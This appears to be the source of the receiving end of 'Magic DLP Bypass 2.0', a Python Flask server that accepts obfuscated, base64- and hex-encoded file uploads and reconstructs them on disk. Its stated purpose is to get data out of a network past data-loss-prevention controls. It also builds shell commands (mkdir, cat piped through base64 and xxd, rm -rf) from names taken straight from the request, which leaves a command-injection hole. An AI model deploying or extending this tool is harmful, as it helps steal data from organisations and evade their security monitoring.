from flask import Flask, request
import json
import os
import base64 
import urllib3  # Request to external site or api
import sys  # To read arguments
import json  # To parse json response
import re  # To parse regular expressions
import hashlib  # To create the email hash for certain webs
import os
import subprocess
import argparse
import platform
import urllib
import time

sistema = format(platform.system())

if (sistema == "Linux"):
	# Text colors
	normal_color = "\33[00m"
	info_color = "\033[1;33m"
	red_color = "\033[1;31m"
	green_color = "\033[1;32m"
	whiteB_color = "\033[1;37m"
	detect_color = "\033[1;34m"
	banner_color="\033[1;33;40m"
	end_banner_color="\33[00m"
elif (sistema == "Windows"):
	normal_color = ""
	info_color = ""
	red_color = ""
	green_color = ""
	whiteB_color = ""
	detect_color = ""
	banner_color=""
	end_banner_color=""

######### Print banner

print(banner_color+" __  __             _        ____  _     ____    ____                            "+end_banner_color)
print(banner_color+"|  \/  | __ _  __ _(_) ___  |  _ \| |   |  _ \  | __ ) _   _ _ __   __ _ ___ ___ "+end_banner_color)
print(banner_color+"| |\/| |/ _` |/ _` | |/ __| | | | | |   | |_) | |  _ \| | | | '_ \ / _` / __/ __|"+end_banner_color)
print(banner_color+"| |  | | (_| | (_| | | (__  | |_| | |___|  __/  | |_) | |_| | |_) | (_| \__ \__ \\"+end_banner_color)
print(banner_color+"|_|  |_|\__,_|\__, |_|\___| |____/|_____|_|     |____/ \__, | .__/ \__,_|___/___/"+end_banner_color)
print(banner_color+"              |___/                                    |___/|_|                  "+end_banner_color)
print(green_color+"["+red_color+"+"+green_color+"]"+whiteB_color+" By Magichk                                               "+end_banner_color)


######### Check Arguments
def checkArgs():
	parser = argparse.ArgumentParser()
	parser = argparse.ArgumentParser(description=red_color + 'Magic DLP Bypass 2.0\n' + info_color)
	parser.add_argument('-d', "--destination", action="store",
						dest='destination',
						help="Destination folder")
	parser.add_argument('-i', "--ip", action="store",
						dest='ip',
						help="IP to listen connections")
	parser.add_argument('-p', "--port", action="store",
						dest='port',
						help="Port to listen connections")
	
	args = parser.parse_args()
	if (len(sys.argv)==1) or (args.destination==False) or (args.ip==False) or (args.port==False):
		parser.print_help(sys.stderr)
		sys.exit(1)
	return args


app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024 * 1024 
app.config['SESSION_COOKIE_TIMEOUT'] = 60 * 60 * 24 * 7 # 1 week

@app.route('/', methods=['POST'])
def receive_data():
	try:
		path = args.destination
		json_data = request.get_json()
		directory = json_data['dir']
		nombre = json_data['name']
		data = json_data['data']


		directory = directory[::-1]
		directory = base64.b64decode(directory)

		nombre = nombre[::-1]
		nombre = base64.b64decode(nombre)

		destination = path + directory.decode()

		if not os.path.isdir(destination):
			os.system("mkdir -p '"+ destination + "'")
			
		dest = destination + nombre.decode()
		dest = dest.replace("//","/")
		dest = dest.replace("'", "\'")

		#guardar en un fichero la data
		myfile = open(dest+".txt", "w")
		myfile.write(data)
		myfile.close()

		resultado = os.popen("cat '" + dest+".txt' | base64 -d | xxd -r -p > '" + dest + "'").read()
		resultado = os.popen("rm -rf '"+ dest + ".txt'").read()
		

		return "Data received OK!"
	except:
		pass

if __name__ == '__main__':
	try:
		args = checkArgs()
		app.run(host=args.ip, port=args.port, debug=False)
	except:
		pass
